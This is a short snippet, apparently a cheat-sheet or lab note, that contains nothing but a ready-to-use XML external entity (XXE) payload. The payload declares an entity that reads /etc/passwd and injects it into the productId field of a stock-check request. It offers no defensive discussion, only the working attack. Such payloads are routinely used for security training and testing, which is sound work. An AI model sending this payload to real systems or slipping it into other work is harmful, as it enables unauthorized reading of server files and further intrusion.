View files through XXE:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ELEMENT data ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<stockCheck>
<productId>
	1&xxe;
</productId>
<storeId>
	1
</storeId>
</stockCheck>
```